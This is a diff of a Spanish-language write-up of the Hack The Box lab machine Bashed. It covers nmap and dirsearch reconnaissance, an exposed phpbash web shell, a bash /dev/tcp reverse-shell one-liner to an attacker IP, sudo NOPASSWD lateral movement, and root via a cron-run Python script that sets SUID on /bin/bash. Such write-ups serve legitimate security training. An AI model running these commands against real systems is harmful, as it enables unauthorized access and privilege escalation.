@@ -21,9 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>
 
-
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Bashes**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.68 -oG allPorts
@@ -45,7 +45,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
            Raw packets sent: 67203 (2.957MB) | Rcvd: 68310 (2.955MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache`.
 
 ```bash
 ❯ nmap -sCV -p80 10.10.10.68 -A -oN targeted -oX targetedXML
@@ -86,7 +86,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -95,30 +95,38 @@ Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que son utilizadas en el sitio web.
 
 ```bash
 ❯ whatweb http://10.10.10.68
 http://10.10.10.68 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.68], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
 ```
 
-
+Accederemos a [http://10.10.10.68](http://10.10.10.68) y verificaremos el siguiente contenido. Verificamos que hay un apartado en donde mencionan algo de `phpbash`.
 
 <figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### Abusing phpbash interactive shell on the website
+
+Al acceder al apartado en donde mencionaban `phpbash`, comprobamos que se trata de la herramienta `phpbash`.
+
+{% hint style="info" %}
+**phpbash** es una herramienta creada para facilitar la ejecución de comandos en servidores web vulnerables. Básicamente, es una **web shell interactiva** escrita en PHP que simula una interfaz de terminal directamente en el navegador. Es como tener un acceso remoto (tipo bash) al servidor a través de una página web.
+{% endhint %}
 
 {% embed url="https://github.com/Arrexel/phpbash" %}
 
-
-
 <figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos **fuzzing** en busca de directorios en el sitio web. Nos encontramos con un directorio algo inusual. Revisaremos el directorio llamado `/dev/`.
 
 ```bash
 ❯ dirsearch -u 'http://10.10.10.68' -i 200 -t 100 2>/dev/null
@@ -145,30 +153,28 @@ Target: http://10.10.10.68/
 Task Completed
 ```
 
-
-
-
+Accediendo a este nuevo directorio encontrado, podemos observar que hay dos archivos `PHP`. Accederemos al archivo nombrado `phpbash.php`.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder al archivo, verificamos que se trata de la herramienta de `phpbash` y podemos ejecutar comandos en el equipo víctima.
 
 <figure><img src="../../.gitbook/assets/imagen (5) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Por lo tanto, nos otorgaremos una Reverse Shell para tener una consola más interactiva. Para ello, nos pondremos en escucha para recibir la conexión.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Desde la herramienta de `phpbash` enviaremos la Reverse Shell hacía nuestro equipo atacante.
 
 ```bash
 bash -c 'bash -i >%26 /dev/tcp/10.10.16.5/443 0>%261'
 ```
 
-
+Verificaremos que hemos logrado obtener acceso al equipo y podemos visualizar la flag de user.tx&#x74;**.**
 
 ```bash
 ❯ nc -nlvp 443
@@ -184,7 +190,11 @@ www-data@bashed:/var/www/html/dev$ cat /home/arrexel/user.txt
 903ab6952c1d********************
 ```
 
+## Privilege Escalation
 
+### Lateral Movement to Scriptmanager via sudo NOPASSWD
+
+Revisando los permisos que dispone el usuario `www-data`, nos encontramos que puede ejecutar como `sudo` cualquier comando como usuario `scriptmanager`.
 
 ```bash
 www-data@bashed:/var/www/html/dev$ sudo -l
@@ -194,9 +204,14 @@ Matching Defaults entries for www-data on bashed:
 
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
+
+www-data@bashed:/var/www/html/dev$ sudo su scriptmanager /bin/bash
+scriptmanager@bashed:/var/www/html/dev$
 ```
 
+### Abuse of Python Script in Scheduled Task
 
+Revisando los directorios de la raíz `/` nos encontamos que a través de este usuario actual somos los propietarios de un directorio llamado `scripts`.
 
 ```bash
 scriptmanager@bashed:/$ ls -l
@@ -220,7 +235,11 @@ drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
 drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
 ```
 
+Accediendo al directorio, nos encontramos con un archivo llamado `test.py` que abre el archivo llamado `test.txt` y escribe en él el texto `testing 123!`.
 
+También comprobamos que el propietario del archivo `test.py` es el usuario que disponemos actualmente, y el archivo que genera el script es el usuario`root`.
+
+Por lo cual, podemos deducir que debe existir una tarea programada (cron) que ejecute el usuario `root` sobre el script mencionado. Por lo tanto, teniendo permisos de editar este archivo, podríamos modificarlo para que realizara las acciones que deseemos.
 
 ```bash
 scriptmanager@bashed:/scripts$ ls -l 
@@ -235,9 +254,7 @@ scriptmanager@bashed:/scripts$ cat test.txt
 testing 123!
 ```
 
-
-
-
+Revisaremos primeramente que el binario de `/bin/bash` no se encuentre con permisos de SUID.
 
 ```bash
 scriptmanager@bashed:/scripts$ find / -perm -4000 2>/dev/null
@@ -248,7 +265,7 @@ scriptmanager@bashed:/scripts$ find / -perm -4000 2>/dev/null
 /bin/ping6
 ```
 
-
+Editaremos el archivo mencionado y le indicaremos que ejecute las siguientes instrucciones. Lo que realizará es dar permisos de `SUID`al binario.
 
 ```bash
 scriptmanager@bashed:/scripts$ cat test.py
@@ -257,14 +274,14 @@ import os
 os.system("chmod u+s /bin/bash")
 ```
 
+Revisaremos que se han asignado correctamente los permisos indicados.
 
-
-```
+```bash
 scriptmanager@bashed:/scripts$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
 ```
 
-
+Abusaremos de estos permisos y nos convertiremos en el propietario del binario y comprobamos que somos actualmente el usuario `root`. Visualizamos la flag de **root.txt**.
 
 ```bash
 scriptmanager@bashed:/scripts$ bash -p
